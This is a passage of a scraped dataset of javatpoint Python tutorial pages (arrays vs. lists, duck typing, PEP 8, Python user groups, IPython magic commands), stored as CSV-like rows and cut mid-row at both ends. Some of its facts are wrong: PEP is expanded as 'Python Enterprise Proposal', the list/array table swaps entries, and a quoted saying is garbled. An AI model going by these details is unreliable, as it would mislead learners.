Record is: [Mark Henry, 1234567890, [email\xa0protected]]', 'Press Enter to continue ...', 'MAIN MENU', '1. Show all existing Contacts', '2. Add a new Contact', '3. Search the existing Contact', '4. Exit', 'Enter your choice: 1', '[Mark Henry, 1234567890, [email\xa0protected]]', 'Press Enter to continue ...', 'MAIN MENU', '1. Show all existing Contacts', '2. Add a new Contact', '3. Search the existing Contact', '4. Exit', 'Enter your choice: 4', 'Thank you for using Phonebook!']",[],"[""|||Storing the Contact Numbers of People|||Searching for the Contact Number using the person's name|||""]"
182,['Python Array vs. List'],"['Python array and lists are the important data structure of Python. Both list and array and list are used to store the data in Python. These data structures allow us to indexing, slicing, and iterating. But they have little dissimilarity with each other. In this tutorial, we will learn the essential difference between the Python list and array.']","['https://www.javatpoint.com/what-is-duck-typing-in-python', 'https://www.javatpoint.com/menu-driven-programs-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/https://www.javatpoint.com/python-arrays', 'https://www.javatpoint.com/what-is-duck-typing-in-python', 'https://www.javatpoint.com/menu-driven-programs-in-python', 'https://www.javatpoint.com/what-is-duck-typing-in-python']",[],[],"['Introduction', 'Python List', 'Array in Python', 'Difference between Array and List', 'Conclusion']",[],[],"['Below is an example of a list.', 'Example - 2', 'In the above list, the first element is an integer; the second is a string and third is a list of characters.', 'To work with the Array in Python, we need to import either an array module or a Numpy.', 'Example - 2: Using Numpy array', 'We have specified the string type and stored the string value.', 'Now, we have a brief introduction and features. Here, we will discuss the differences between the Array and List.']","['As we know that, Python has extensive data structures such as lists, tuples, sets, and dictionaries that provide many features and functions. The lists are the most effective and easy-to-use data structure in Python.', 'A list is a built-in, linear data structure of Python. It is used to store the data in a sequence manner. We can perform several operations to list, such as indexing, iterating, and slicing. The list comes with the following features.', 'An array is also a linear data structure that stores the data. It is also ordered, mutable, and enclosed in square brackets. It can store the non-unique items. But there are restrictions to store the different data type values.', ""Elements are allocated in contiguous memory location that allows us to easy modification, addition, deletion, accessing of element. Moreover, we need to specify the data type. Let's understand the following example."", 'We have discussed the differences between array and list. Both data types are essential in Python and both have some limitations. Python lists are easy to use in python where arrays are typically used for data analysis.']","[""On the other hand, Python doesn't provide built-in support to the array. We need to import the array module to use the array module or from the NumPy package in the Python program. And that's a primary difference between the array and list. Before diving deep into this topic, let's have a brief introduction to both data structures.""]","['list = [31, 60, 19, 12]', 'print(list)', 'print(type(list))', '# creating a list containing elements', '# belonging to different data types', 'list1 = [1,""Yash"",[\'a\',\'e\']]', 'print(list1)', 'import array as arr', 'import numpy as np', 'Import array as arr', 'array_1 = arr.array(""i"", [31, 60,19, 12])', 'print(array_1)', 'print(type(array_1))', 'import numpy as np', 'array_sample = np.array([""str"", \'sunil\', \'sachin\', \'megha\', \'deepti\'])', 'print (array_sample)', 'print(type(array_sample))']","['[31, 60, 19, 12]', ""<class 'list'>"", ""[1, 'Yash', ['a', 'e']]"", ""array('i', [31, 60, 19, 12])"", ""<class 'array.array'>"", ""['numbers' 'sunil' 'sachin' 'megha' 'deepti']"", ""<class 'numpy.ndarray'>""]","[""Sr. No|||List|||Array&&&1.|||The list can store the value of different types.|||It can only consist of value of same type.&&&2.|||The list cannot handle the direct arithmetic operations.|||It can directly handle arithmetic operations.&&&3.|||We need to import the array before work with the array.|||The lists are the build-in data structure so we don't need to import it.&&&4.|||The lists are less compatible than the array to store the data.|||An array are much compatible than the list.&&&5.|||It consumes a large memory.|||It is a more compact in memory size comparatively list.&&&6.|||It is suitable for storing the longer sequence of the data item.|||It is suitable for storing shorter sequence of data items.&&&7.|||We can print the entire list using explicit looping.|||We can print the entire list without using explicit looping.&&&8.|||It can be nested to contain different types of elements.|||It must contain either all nested elements of same size.""]","['|||The list elements are enclosed with a square bracket, and each element is separated by a comma (,).|||It is a mutable type which means we can modify the list items after their creation.|||The lists are ordered, which means items are stored in a specific order. We can use indexing to access the list element.|||We can store the items of different data types. We can combine strings, integers, and objects in the same list.|||']"
183,['What is duck typing in Python?'],"['In this tutorial, we will learn about duck typing. It is a popular term in Python, and it comes from saying, ""If it walks like duck, swims like duck, looks like a duck, then it probably should be a duck."" ']","['https://www.javatpoint.com/pep-8-in-python', 'https://www.javatpoint.com/python-array-vs-list', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/pep-8-in-python', 'https://www.javatpoint.com/python-array-vs-list', 'https://www.javatpoint.com/pep-8-in-python']",[],[],"['Dynamic vs. Static Typing', 'Concept of Duck Typing', 'How duck typing supports EAFP']",[],[],"['We will discuss what is exactly mean of duck typing in Python programming. ', ""Above code cannot be compiled, because we couldn't assign a string in Swift language. Because variable a was declared as an integer."", ""Let's see another example."", 'Example - 2', 'When we see a lot of if-else blocks, then it is an LBYL coding style.', 'But if we see a lot of try-except blocks, then it is a probability an EAFP coder.']","[""The above statement gives an idea to identify a duck. Here we don't need to have a genomic sequence of the duck. We draw our conclusion by its behavior and external appearances."", 'Python follows the EAFP (Easier to Ask Forgiveness than Permission) rather than the LBLY (Look Before You Leap) philosophy. The EAFP is somewhat linked to the ""duck typing"" style.', 'Many other programming languages such as Java, swift are the static type. We need to declare variable with the data types. In the below example, we try to do the same thing using the Swift instead of Python.', ""Earlier, we have discussed that Python is a dynamic typed language. However, we can use the dynamic approach with custom data types. Let's understand the following example."", 'The duck typing is the most appropriate style for the EAFP because we don\'t need to focus on the ""type"" of the object. We only need to take care of its behavior and capability. Let\'s see the following statements.']","[""The main reason for using duck typing is to provide support for dynamic typing in Python programming. In Python, we don't need to specify the variable's data type and we can reassign the different data type values to same variable in further code. Let's see the following example."", 'As we can see in the above code, we assigned an integer to a variable x, making it of the int type. Then, we assigned a string and a list to the same variable. Python interpreter accepts the changes of data types of the same variable. This is a dynamic typing behavior.', 'In the above code, we have created a VisualStudio class that has to execute() method. In the desktop-class, we have passed the ide as an argument in the code(). An ide is an object of VisualStudio class. With the help of ide, we called the execute() method of VisualStudio class.', ""In the above code, the Duck class's instance is reflected by calling the duck_testing function. It also happens with the Sparrow class, which implements the swim() function. But in the case of the Crocodile class, it fails the duck testing evaluation because it doesn't implement the swim() function.""]","['x = 12000', 'print(type(x))', ""x = 'Dynamic Typing'"", 'print(type(x))', 'x = [1, 2, 3, 4]', 'print(type(x))', '# integer value assigning in JavaScript', 'var a = 10', '# Assinging string in swift', ""a = 'Swift language'"", 'class VisualStudio:', 'def execute(self):', ""print('Compiling')"", ""print('Running')"", ""print('Spell Check')"", ""print('Convention Check')"", '', 'class Desktop:', 'def code(self, ide):', 'ide.execute()', 'ide  = VisualStudio()', 'desk = Desktop()', 'desk.code(ide)', 'class Duck:', 'def swim(self):', 'print(""I\'m a duck, and I can swim."")', 'class Sparrow:', 'def swim(self):', 'print(""I\'m a sparrow, and I can swim."")', 'class Crocodile:', 'def swim_walk(self):', 'print(""I\'m a Crocodile, and I can swim, but not quack."")', 'def duck_testing(animal):', 'animal.swim()', 'duck_testing(Duck())', 'duck_testing(Sparrow())', 'duck_testing(Crocodile())']","[""<class 'int'>"", ""<class 'str'>"", ""<class 'list'>"", 'Compiling', 'Running', 'Spell Check', 'Convention Check', ""I'm a duck, and I can swim."", ""I'm a sparrow, and I can swim."", 'Traceback (most recent call last):', 'File ""<string>"", line 24, in <module>', 'File ""<string>"", line 19, in duck_testing', ""AttributeError: 'Crocodile' object has no attribute 'swim'""]",[],[]
184,['PEP 8 in Python | what is the purpose of PEP 8 in Python?'],"['In this tutorial, we will learn what PEP-8 is and how we can use it in Python coding. We will discuss the guidelines for using PEP in programming-this tutorial is aimed at beginners to intermediate. We will also discuss the benefits of using PEP-8 while coding.']","['https://www.javatpoint.com/python-user-groups', 'https://www.javatpoint.com/what-is-duck-typing-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/http://www.pep8.org', 'https://www.javatpoint.com/python-user-groups', 'https://www.javatpoint.com/what-is-duck-typing-in-python', 'https://www.javatpoint.com/python-user-groups']",[],[],"['What is PEP?', 'Why PEP 8 is Important?', 'Naming Convention', 'Name Style', 'Code Layout', 'Put the Closing Braces', 'Comments', 'Avoid Unnecessary Adding Whitespaces', 'Programming Recommendation', 'Conclusion']","['Indentation', 'Indentation following Line Break', 'Use docstring', 'Should a Line Break Before or After a Binary Operator?', 'Importing module', 'Blank Lines', 'Block Comment', 'Inline Comments', 'Avoid comparing Boolean values using the equivalence operator', 'Empty sequences are false in if statements', ""Don't use not is in if statement""]","['Note: While using abbreviations in CapWords, capitalize all the letters of the abbreviation. Thus HTTPServerError is better than HttpServerError.']","['Adaptive a nice coding style makes the code more readable. The code becomes easy for end-user.', ""PEP 8 enhances the readability of the Python code, but why is readability so important? Let's understand this concept."", 'We will describe few important guidelines for writing effective code that can be read by others as well.', 'Single lowercase letter', 'Single upper case letter', 'Lower_case_with_underscores', 'UPPER_CASE_WITH_UNDERSCORES', 'CapitalizedWords (or CamelCase)', 'Below is the table that specifies some of the common naming styles in Python. Consider the following table.', 'The code layout defines how much the code is readable. In this section, we will learn how to use whitespace to improve code readability.', 'We can use the following structure.', 'As we can see in the above example, it seems quite messy to read. We can solve such types of problems by using the following structure.', 'Python allows us to break line before or after a binary operator, as long as the convention is consistent locally.', 'We should import the modules in the separates line as follows.', 'We can also use the following approach.', 'However, we can use the explicit relative imports instead of absolutes imports, especially dealing with complex packages.', 'The above way can remove the whitespaces to improve the readability of code.', 'Both methods are suitable to use, but consistency is key, so choose any one and continue with it.', 'PEP 8 provides the following rules to write comment block.', ""Let's see the following code."", ""We can use more than paragraph for the technical code. Let's understand the following example."", 'Following is the example of inline comments.', 'Sometimes, we can use the naming convention to replace the inline comment.', 'We can use the following naming convention.', 'Inline comments are essential but block comments make the code more readable.', ""Let's see the following example."", 'Example - 1', 'Example - 3', ""We shouldn't use the equivalence operator == to compare the Boolean values. It can only take the True or False. Let's see following example."", ""This approach is simple that's why PEP 8 encourages it."", 'If we want to check whether a given list is empty, we might need to check the length of list, so we need to avoid the following approach.', 'However, if there is any empty list, set, or tuple. We can use the following way to check.', ""The second method is more appropriate; that's why PEP 8 encourages it."", 'There are two options to check whether a variable has a defined value. The first option is with x is not None, as in the following example.', 'A second option is to evaluate x is None and if statement based on not the outcome.', 'Both options are correct but the first one is simple, so PEP 8 encourages it.']","[""At this point, we must have an idea of why we wrote the particular line in the code. The code should reflect the meaning of each line. That's why readability is so much important."", ""The naming convention in Python is slightly messy, but there are certain conventions that we can follow easily. Let's see the following naming convention."", 'Above are some common naming conventions that are useful to beautify the Python code. For additional improvement, we should choose the name carefully.', 'In the above example, the indented print statement will get executed if the condition of if statement is true. This indentation defines the code block and tells us what statements execute when a function is called or condition trigger.', 'We can also use the tabs to provide the consecutive spaces to indicate the indentation, but whitespaces are the most preferable. Python 2 allows the mixing of tabs and spaces but we will get an error in Python 3.', 'The import statement should be written at the top of the file or just after any module comment. Absolute imports are the recommended because they are more readable and tend to be better behaved.', ""We can break lines inside parentheses, brackets using the Line continuations. PEP 8 allows us to use closing braces in implies line continuations. Let's understand the following example."", 'Comments are the integral part of the any programming language. These are the best way to explain the code. When we documented our code with the proper comments anyone can able to understand the code. But we should remember the following points.', 'Block comments are the good choice for the small section of code. Such comments are useful when we write several line codes to perform a single action such as iterating a loop. They help us to understand the purpose of the code.', 'Inline comments are used to explain the single statement in a piece of code. We can quickly get the idea of why we wrote that particular line of code. PEP 8 specifies the following rules for the inline comments.', 'In some cases, use of whitespaces can make the code much harder to read. Too much whitespaces can make code overly sparse and difficult to understand. We should avoid adding whitespaces at the end of a line. This is known as trailing whitespaces.', 'As we know that, there are several methods to perform similar tasks in Python. In this section, we will see some of the suggestions of PEP 8 to improve the consistency.']","[""The PEP is an abbreviation form of Python Enterprise Proposal. Writing code with proper logic is a key factor of programming, but many other important factors can affect the code's quality. The developer's coding style makes the code much reliable, and every developer should keep in mind that Python strictly follows the way of order and format of the string."", 'PEP 8 is a document that provides various guidelines to write the readable in Python. PEP 8 describes how the developer can write beautiful code. It was officially written in 2001 by Guido van Rossum, Barry Warsaw, and Nick Coghlan. The main aim of PEP is to enhance the readability and consistency of code.', 'Creator of Python, Guido van Rossum said, ""Code is much more often than it is written."" The code can be written in a few minutes, a few hours, or a whole day but once we have written the code, we will never rewrite it again. But sometimes, we need to read the code again and again.', 'When we write the code, we need to assign name to many things such as variables, functions, classes, packages, and a lot more things. Selecting a proper name will save time and energy. When we look back to the file after sometime, we can easily recall what a certain variable, function, or class represents. Developers should avoid choosing inappropriate names.', ""Unlike other programming languages, the indentation is used to define the code block in Python. The indentations are the important part of the Python programming language and it determines the level of lines of code. Generally, we use the 4 space for indentation. Let's understand the following example."", ""It is essential to use indentation when using line continuations to keep the line to fewer than 79 characters. It provides the flexibility to determining between two lines of code and a single line of code that extends two lines. Let's understand the following example."", ""Python provides the two types of document strings or docstring - single line and multiple lines. We use the triple quotes to define a single line or multiline quotes. Basically, these are used to describe the function or particular program. Let's understand the following example."", ""The lines break before or after a binary operation is a traditional approach. But it affects the readability extensively because the operators are scattered across the different screens, and each operator is kept away from its operand and onto the previous line. Let's understand the following example."", 'Blank lines can be improved the readability of Python code. If many lines of code bunched together the code will become harder to read. We can remove this by using the many blank vertical lines, and the reader might need to scroll more than necessary. Follow the below instructions to add vertical whitespace.', 'We have discussed the PEP 8 guidelines to make the code remove ambiguity and enhance readability. These guidelines improve the code, especially when sharing the code with potential employees or collaborators. We have discussed what PEP is and why it uses, how to write code that is PEP 8 compliant. Moreover, we have a brief introduction to the naming conventions. If you want more information regarding the PEP 8, you can read the full documentation or visit PEP8.org.']","['var = 10', 'number_of_apple = 5', 'VAR = 6', 'NUM_OF_CARS =20', 'NumberOfBooks = 100', 'if x ==  5:', ""print('x is larger than 5')"", '# Correct Way:', '# Aligned with opening delimiter.', 'obj = func_name(argument_one, argument_two,', 'argument_three, argument_four', ""# first line doesn't has any argument"", '# We add 4 spaces from the second line to discriminate arguments from the rest.', 'def function_name(', 'argument_one, argument_two, argument_three,', 'argument_four):', 'print(argument_two)', '# 4 space indentation to add a level.', 'foo = long_function_name(', 'var_one, var_two,', 'var_three, var_four)', 'def add(a, b):', '""""""This is simple add method""""""', '""""""This is', 'simple add program to add', 'the two numbers. """"""', '# Wrong:', '# operators sit far away from their operands', 'marks = (engilsh_marks +', 'math_marks +', '(science_marks - biology_marks) +', 'Physics_marks', '# Correct:', '# easy to match operators with operands', 'Total_marks = (English_marks', '+ math_marks', '+ (science_marks - biology_marks)', '+ physics_marks', 'import pygame', 'import os', 'import sys', 'import sys, os', 'from subprocess import Popen, PIPE', 'import mypkg.sibling', 'from mypkg import sibling', 'from mypkg.sibling import example', 'class FirstClass:', 'pass', 'class SecondClass:', 'pass', 'def main_function():', 'return None', 'class FirstClass:', 'def method_one(self):', 'return None', 'def second_two(self):', 'return None', 'def cal_variance(n_list):', 'list_sum = 0', 'for n in n_list:', 'list_sum = list_sum + n', 'mean = list_sum / len(n_list)', 'square_sum = 0', 'for n in n_list:', 'square_sum = square_sum + n**2', 'mean_squares = square_sum / len(n_list)', 'return mean_squares - mean**2', 'list_numbers = [', '5, 4, 1,', '4, 6, 3,', '7, 8, 9', 'list_numbers = [', '5, 4, 1,', '4, 6, 3,', '7, 8, 9', 'for i in range(0, 5):', '# Loop will iterate over i five times and print out the value of i', '# new line character', ""print(i, '\\n')"", 'a = 10    # The a is variable that holds integer value.', ""x = 'Peter Decosta' #This is a student name"", ""Student_name = 'Peter Decosta'"", '# Recommended', 'list1 = [1, 2, 3]', '# Not recommended', 'List1 = [ 1, 2, 3, ]', '# Recommended', 'print(x, y)', '# Not recommended', 'print(x , y)', '# Not recommended', 'bool_value = 10 > 5', 'if bool_value == True:', ""return '10 is bigger than 5'"", '# Recommended', 'if my_bool:', ""return '10 is bigger than 5'"", '# Not recommended', 'list1 = []', 'if not len(list1):', ""print('List is empty!')"", '# Recommended', 'list1 = []', 'if not list1:', ""print('List is empty!')"", '# Recommended', 'if x is not None:', ""return 'x exists!'"", '# Not recommended', 'if not x is None:', ""return 'x exists!'""]",[],"['Type|||Naming Convention|||Examples&&&Function|||We should use the lowercase words or separates words by the underscore.|||myfunction, my_function&&&Variable|||We should use a lowercase letter, words, or separate words to enhance the readability.|||a, var, variable_name&&&Class|||The first letter of class name should be capitalized; use camel case. Do not separate words with the underscore.|||MyClass, Form, Model&&&Method|||We should use a lowercase letter, words, or separate words to enhance readability.|||class_method, method&&&Constant|||We should use a short, uppercase letter, words, or separate words to enhance the readability.|||MYCONSTANT, CONSTANT, MY_CONSTANT&&&Module|||We should use a lowercase letter, words, or separate words to enhance the readability.|||Module_name.py, module.py&&&Package|||We should use a lowercase letter, words, or separate words to enhance the readability. Do not separate words with the underscore.|||package, mypackage,']","[""|||Tabs vs. Space||||||Top-level function and classes with two lines - Put the extra vertical space around them so that it can be understandable.||||||Single blank line inside classes - The functions that we define in the class is related to one another. Let's see the following example -||||||Use blank lines inside the function - Sometimes, we need to write a complicated function has consists of several steps before the return statement. So we can add the blank line between each step. Let's understand the following example.||||||Line up the closing brace with the first non-whitespace.||||||Line up the closing braces with the first character of line.||||||Start with the capital latter, and write complete sentence.|||Update the comment in case of a change in code.|||Limit the line length of comments and docstrings to 72 characters.||||||Indent block comment should be at the same level.|||Start each line with the # followed by a single space.|||Separate line using the single #.||||||Start comments with the # and single space.|||Use inline comments carefully.|||We should separate the inline comments on the same line as the statement they refer.|||""]"
185,['Python User Groups'],"['Python User Group, also known as PUG, is an open and informal collaborative space for the programmers to explore the intermediate and advanced sections of Python Programming Language. Developers can share their utilization of the language and new tricks with each other and help to maintain a productive environment. This User Group also acts as an excellent opportunity for Python Beginners and allows them to step in. This Python User Group is a great place to support and socialize with different developers through similar interests. These Python programming language users also schedule meetings generally once every month.']","['https://www.javatpoint.com/basic-commands-in-python', 'https://www.javatpoint.com/pep-8-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://wiki.python.org/moin/LocalUserGroups', 'https://www.javatpoint.com/https://www.meetup.com/topics/python/', 'https://www.javatpoint.com/http://python.meetup.com/', 'https://www.javatpoint.com/basic-commands-in-python', 'https://www.javatpoint.com/pep-8-in-python', 'https://www.javatpoint.com/basic-commands-in-python']",[],[],[],"['What is Python User Group?', 'Starting Python User Group', ""What is an 'In House User Group'?"", 'General Instructions']",[],"['However, if there is no Python User Group available near us, we can also start our own Users Group if interested.', 'We will be discussing a lot more on Starting a User group and In House Users Group in detail.', 'These are some primary steps in order to prepare before the first meeting:', 'Once the Agenda is cleared, let us discuss how to promote the User Group.', 'Promoting the User Group', 'Finding the appropriate location', 'Organizing Activities', 'It is necessary to decide the flavor of the meetings while organizing the Activities. We can also organize different activities in the sessions:', ""Now, let's talk about some possible Group Projects."", 'Possible Group Projects', 'Here is a list of some Group Projects given below:', ""Now, let us discuss 'In House User Groups'."", 'These Groups often contain several values above and beyond Local User Groups:', 'Let us discuss some General Instructions.', 'Here are some general instructions we have to keep in mind while being a member of the ""In House User Group"":']","['One can also locate the nearest Python User Group using a world map of Python Meetups provided on https://www.meetup.com/topics/python/. All we have to enter the country and city in order to list the local group if available.', 'In addition to the above, there is a number of ""In House Users Group"" available within few, generally larger companies. However, these groups are usually operational with the workers of the company.']","['There are around 1,637 Python user groups available globally in approximately 191 cities, 37 countries with more than 860,333 group members. A List of these Python User Groups can be found on the official website of Python: https://wiki.python.org/moin/LocalUserGroups.', 'In the following section, we will be discussing how to start a new Python User Group in a local area. But we get started, we should ensure that there is not an existing Local User Group already. In the case of the current User Group, it is essential to improve the services instead of creating a new User Group.', ""'In House User Groups' are similar to Local User Groups; however, both groups have few distinct differences that make starting or running slightly different. 'In House User Groups' are generally closed, which means that it is limited to their membership to developers and programmers within the particular organization or company.""]",[],[],[],"['|||Defining the name of the group: generally, Python <name of the city>|||Designing a website, preferably with our domain name, so that we can include the URL during the group promotion.|||Defining a location for the meeting.|||Defining the meeting style for the group.|||Finding some people to expand the organizers\' team. Getting some people to sign up as a core member of the organization helps prevent our burn-out and reduces the \'bus number\', for when we are indisposed. (Such as on holiday, hospitalized, and many more).|||Defining several means to promote the group.||||||Being an Organizer, we can promote our Python User Group by creating a chapter on http://python.meetup.com/. We can also use some standard ways to communicate meetings.|||We can post an e-mail to mail.python.org e-mail lists ""python-announce"" and ""python-list"" for every meeting or other organized event.|||One can also prefer other mailing lists, newsgroups, RSS, Twitter, and many more.|||Adding the Group in the official Local User Groups. This will allow other Local Python Users to join us.|||Identifying other Local User Groups and posting a meeting announcement with their permission.|||Hanging several flyers at local college, organizing some meetings on campus, and getting listed as a campus organization.|||Producing some podcasts and screencasts and getting them listed on video.google.com, Python 411, and many more. Including a publicity blurb related to the group will also let us expand the User Group.|||Setting up Google Advertisements or similar campaigns targeting the local geographic area for search terms like Java, Python, and Scripting. Maintaining the spread local will helps in keeping the cost pretty reasonable.||||||It is considered good to have a location we can depend upon monthly, without failure.|||We can also search for sponsors to invest in the User Group.|||A library is also an option; however, its hours can be limited.|||One can also choose Bars in order to host groups on off-nights.|||Coworking Spaces are also a good option, as they need their members to be able to network.||||||We can organize a Presentation.|||We can also do the Lightning Talks on some topics related to Python.|||Code review is also a good example.|||We can also display several videos on different topics.|||Organizing the walkthroughs for different Projects will also be considered as the center of attraction.|||We can also discuss the Standard Python Module of the month and practice different projects.|||We can also organize a meeting at a local restaurant once a month or hold a Super-weekend session twice every month.||||||Creating a club website as a group using one of the Web Frameworks of Python.|||Establishing a Wiki, Subversion Repository, and Club Mailing List.|||Consider producing Audio Recordings through Podcasts. This is generally a good option if the Group is geologically disseminated or can\'t agree on the meeting locations or times.|||We can also organize a ""Scripting Conference"" in the Area, which allows other proponents of different languages to come under one roof. This will help us expand the user groups as some people will convert either because our Group looks more fun or Python is such an excellent Programming Language.|||Moreover, we can also organize a ""Web Technology Conference"" in the area, which again helps us expanding the Local User Group.|||Apart from the above, we can organize Social Meetings, Conferences, and even Hack sessions.||||||These groups promote the utilization of Python within the organization or company.|||We are more likely to deliberate particular projects, challenges, and issues within the Organization without worrying about privacy. However, be aware of some confidentiality issues that may arise, unfortunately.|||Organizations or Companies may also provide different internal resources, training, and support that would not be available or relevant to the Outsiders.|||The ability to detect and link probable internal assistance with projects or challenges can be priceless.|||These groups may present some internal projects to a broader inner listener, be it other user groups or the more comprehensive business structure.|||Involvement may well assist with professional development in some organizations or companies.||||||Sounding Out the interest level in the probability of having an ""In House User Group"": Making it clear that this group is just a probability at this level.|||Seeking and obtaining the official permission before we start - We can consider the following issues:||||||Who do we have to obtain the approval from?|||The level of interest being expressed|||Whether we will be utilizing the company resources like computers, bandwidth, and many more or not.|||Whether the meetings will be organized within the office hours or not.|||What will be the schedule of the meetings?|||Whether the discussions be allowed to involve the current projects and challenges and potentially impact privacy, Internet Protocol, and more or not.|||The number of people that are likely to be involved initially and over a while.|||Whether the User Group probably is representing the organization externally in some context. For example, at some more comprehensive conferences, in presenting papers, and many more.|||Expected Advantages to the Organization or the company - This is a significant fact to plan for the discussion - the approval depends on whether the organization or company is getting a clear benefit or not.||||||It is advisable to have multiple organizers to prevent conflicts with holidays, sickness, urgent projects, retirements, and more.|||There should be an organizer in the meeting at the advertised commencement time.|||In case of Cancellations, Rescheduling or Relocations, the process should be carried timely as soon as possible and be as widely notified as possible.|||It is also recommended to be prepared for no-show speakers - The Stand-by Speaker or the Organizer with an available backup discussion. This will reduce the chance of any future disappointments during the meeting or event.|||Setting a Code of Conduct compatible with the organization or company policies; however, the main motto should also reflect the general guidelines of Python programming language, such as:||||||Inclusive & Welcoming: that is, Open to all Ability Levels|||Non-Discriminatory: Not allowing ant bias based on problems like sex, religion, race, age, orientation, mental or physical attributes, and many more.||||||Deciding a name for the User Group:Generally, it is a combination of the letters PUG along with the initials of the organization or company; however, it is recommended to be aware of the conflicting possibility with other groups, acronyms, possibly offensive names, and a lot more.|||We can also design a logo for the group to utilize any organization or company logos along with the python logo.|||We can also vary the meeting\'s content and format between sessions - A mix of Formal Presentations, QNA, Short Presentations, Workshops, Favorite Library Discussions, and a lot more. This will be meeting more productive and interesting.|||']"
186,['Basic Commands in Python | Magic Commands'],"['When Python was introduced in 1991, it was general assumption that Python is ""use at own risk"" language. But situation has changed; Python is a dominant language at present time, it is used for data science, machine learning, and software development.']","['https://www.javatpoint.com/f-string-in-python', 'https://www.javatpoint.com/python-user-groups', 'https://www.javatpoint.com/f-string-in-python', 'https://www.javatpoint.com/python-user-groups', 'https://www.javatpoint.com/f-string-in-python']","['https://static.javatpoint.com/python/images/basic-commands-in-python.png', 'https://static.javatpoint.com/python/images/basic-commands-in-python2.png']",[],"['Introduction', 'Built -in Magic commands', 'Execute the Html Script in IPython']","['1.%autocall [mode]', '2. %automagic', '3. %run', '4. %cd', '5. %dhist', '6. %edit', '7. %env[GUINAME]', '8. %%timeit', '9. %lsmagic', '10. %who', '11. %pinfo <variable_name>', '13. %matplotlib inline', '14. %hist', 'Working with Environment Variable', 'Conclusion']",['Note - We can offer access to already defined variables using %run -i.'],"['As we know that Python is a flexible language. So we can add new features and functions such as magic command.', 'This tutorial will discuss about the magic commands. These magic commands surely help to reduce the lot of headache.', 'We can use the two different forms of magic commands in IPython.', ""Let's learn about the most popular and interesting commands."", 'The %autocall[mode] magic function is used to make a function automatically callable without having to use parentheses.', 'The magic function can be also callable without having to initial % if we set to 1. We need to set to 0 to deactivate it.', 'Suppose we have a file named program_test.py with the following code.', 'We use the following statement to run.', 'The script will run without importing defined variables.', 'The above command will behave same as the python program_script.py file.', 'Now we can access all the variables of executed file in IPython shell.', 'This magic command changes the current directory. It automatically manages the internal list of directories we visit during IPython session.', ""The above command calculates the time taken by the IPython environment to execute a Python program. Let's understand the following program."", ""This command will return the list of all magic command. Let's see the following example."", 'The above command will return a list of all variables that are defined in the current notebook.', 'This command returns the history of the current notebook. Means, what we have done so far in the current notebook.', 'We can execute the HTML and JavaScript code using the magic command. It helps us to provide some simple UI elements to our code.', '%%html allows us to execute the html script.', '%%js allows us to execute the JS script.', ""Let's see the following example."", 'This command offers us to access and handle system environment variables.']","['It is a very useful magic command; it prints all the directories we have visited in current session. Every time %cd command is executed, this is updated in _dh variable.', 'The edit magic command unlocks the default text editor of current operating system (Notepad for Window) for editing a Python script. We can edit the current Python script in editor.', 'This magic command is used to enable and disables IPython GUI event loop integration. When we use the GUINAME argument, this command replaces the default GUI toolkits by the specified one.', ""It returns the detailed information about the variable. We can inspect the object that is stored in the particular variable name. Let's understand the following example."", 'It is used to display the matplotlib graph in the Jupyter notebook. However, this command is available in the older version of Jupyter notebook. In the newer versions, this is no longer in use.', 'In this tutorial, we have covered the important magic commands of the Jupyter notebook. These commands make work easier and also provide the flexibility to use notebook efficiently.']","['Magic commands are easy designed syntax that facilitates us to perform routine task. These are basically created to accomplish some common task in data analysis using Python. In fact, they control the nature of IPython itself. It is used to running an external script or calculating the execution time of a piece of code.']","['Automagic is OFF, % prefix IS needed for line magics.', 'def name()', 'print(""Hello I am Stuart?)', '%run program_test.py', 'C:\\Users\\DEVANSH SHARMA', 'Directory history (kept in _dh)', '0: C:\\Users\\DEVANSH SHARMA', 'IPython will make a temporary file named: C:\\Users\\DEVANS~1\\AppData\\Local\\Temp\\ipython_edit_z41uo6o8\\ipython_edit_zwb99en9.py', '%%timeit', 'square_numbers = [num**2 for num in range(1,1000)]', '%lsmagic', 'a\t b\t c\t name\t z', '%pinfo a', '%env[GUINAME]', '%automagic', 'def name()', ""print('Hello I am Stuart')"", 'def name():', ""print('Hello I am Stuart')"", '%%timeit', 'square_number = []', 'for num in range(1,100):', 'sqaure_number.append(num**2)', '%%timeit', 'square_numbers = []', 'for num in range(1,100):', 'sqaure_numbers.append(num**2)', '%%timeit', 'square_numbers = [num**2 for num in range(1,1000)]', '<h3>Student Marks</h3>', '<table>', '<tr>', '<th>Name</th>', '<th>Roll</th>', '<th>Age</th>', '<th>Marks</th>', '</tr>', '<tr>', '..........................................', '..........................................', '..........................................', '<h3>Employee Details</h3>', '<table>', '<tr>', '<th>Name</th>', '<th>Designation</th>', '<th>Age</th>', '<th>Salary</th>', '</tr>', '<tr>', '<td>Peter</td>', '<td>HR</td>', '<td>29</td>', '<td>93000</td>', '</tr>', '<tr>', '<td>Parker</td>', '<td>IT</td>', '<td>24</td>', '<td>92000</td>', '</tr>', '<tr>', '<td>Adam</td>', '<td>IT</td>', '<td>26</td>', '<td>120000</td>', '</tr>', '</table>', '</body>', '</html>', ""'Windows_NT'""]","['659 µs ± 19.8 µs per loop (mean ± std. dev. of 7 runs, 1000 loops each)', 'Type:        int', 'String form: 10', 'Docstring:', 'int([x]) -> integer', 'int(x, base=10) -> integer', 'Convert a number or string to an integer, or return 0 if no arguments', 'are given.  If x is a number, return x.__int__().  For floating point', 'numbers, this truncates towards zero.', 'If x is not a number or if base is given, then x must be a string,', 'bytes, or bytearray instance representing an integer literal in the', ""given base.  The literal can be preceded by '+' or '-' and be surrounded"", 'by whitespace.  The base defaults to 10.  Valid bases are 0 and 2-36.', 'Base 0 means to interpret the base from the string as an integer literal.', "">>> int('0b100', base=0)"", '4', ""{'ALLUSERSPROFILE': 'C:\\\\ProgramData',"", ""'APPDATA': 'C:\\\\Users\\\\DEVANSH SHARMA\\\\AppData\\\\Roaming',"", ""'C:\\\\PROGRAMDATA\\\\ANACONDA3\\\\SCRIPTS\\\\': 'C:\\\\ProgramData\\\\Anaconda3',"", ""'C:\\\\USERS\\\\DEVANSH SHARMA\\\\APPDATA\\\\ROAMING\\\\NPM': 'C:\\\\Users\\\\DEVANSH SHARMA\\\\AppData\\\\Roaming\\\\npm',"", 